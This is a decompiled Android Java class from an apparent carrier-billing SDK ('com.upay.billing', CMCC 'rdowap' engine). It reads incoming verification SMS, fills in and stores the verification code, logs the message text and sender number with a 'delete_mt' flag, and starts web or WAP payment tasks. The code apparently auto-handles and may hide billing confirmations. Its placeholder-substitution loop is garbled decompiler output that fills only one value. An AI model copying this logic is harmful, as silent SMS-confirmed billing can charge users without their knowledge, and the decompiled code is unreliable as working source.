package com.upay.billing.engine.rdowap;

import android.content.Context;
import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.util.List;
import org.json.JSONObject;

public class Main
  extends CommonEngine
{
  public Main() {}
  
  public Op getOp()
  {
    return Op.CMCC;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    Boolean localBoolean = Boolean.valueOf(false);
    if (paramOp.equals(Op.CMCC)) {
      localBoolean = Boolean.valueOf(true);
    }
    return (localBoolean.booleanValue()) && (paramBoolean1) && (paramBoolean2);
  }
  
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    int i = 0;
    int j = 0;
    Object localObject = this.core.getContext();
    String str2 = paramMtContext.trade.appKey;
    if ("verify".equals(paramJson.getStr("type")))
    {
      String str1 = null;
      String str3 = paramJson.getStr("msg");
      i = paramArrayOfString.length;
      for (paramJson = str1;; paramJson = str3.replace("$" + (i + 1), paramArrayOfString[i]))
      {
        i -= 1;
        if (i < 0) {
          break;
        }
      }
      Log.e("RdowapEngine", "veriftMsg--->" + paramJson);
      Util.saveString((Context)localObject, "verifycode", paramJson);
      paramArrayOfString = this.core;
      str1 = paramMtContext.trade.id;
      localObject = paramMtContext.trade.goodsKey;
      str3 = paramMtContext.cmd.key;
      String str4 = paramMtContext.cmd.btKey;
      i = j;
      if (paramMtContext.cmd.deleteMt) {
        i = 1;
      }
      paramArrayOfString.logEvent(str2, "verify_handle", Json.createObject(new Object[] { "trade_id", str1, "goods_key", localObject, "cmd_key", str3, "bt_key", str4, "delete_mt", Integer.valueOf(i), "description", "rdo", "mt_msg", paramString2, "mt_num", paramString1, "result", Integer.valueOf(200), "sn", paramMtContext.serialNo, "up_msg", paramJson, "up_num", paramString1 }).asObject().toString());
      i = 65736;
    }
    return i;
  }
  
  public void pay(Trade paramTrade, List paramList)
  {
    this.core.activateHandlers(paramTrade, paramTrade.id + "01", "", (Cmd)paramList.get(0));
    if ("WIFI".equals(Util.getNetType(this.core.getContext())))
    {
      new RdoWebPayTask(this.core.getContext(), paramTrade, paramList).execute(new Object[0]);
      return;
    }
    new RdoWapPayTask(this.core.getContext(), paramTrade, paramList).rdoWapPay();
  }
}
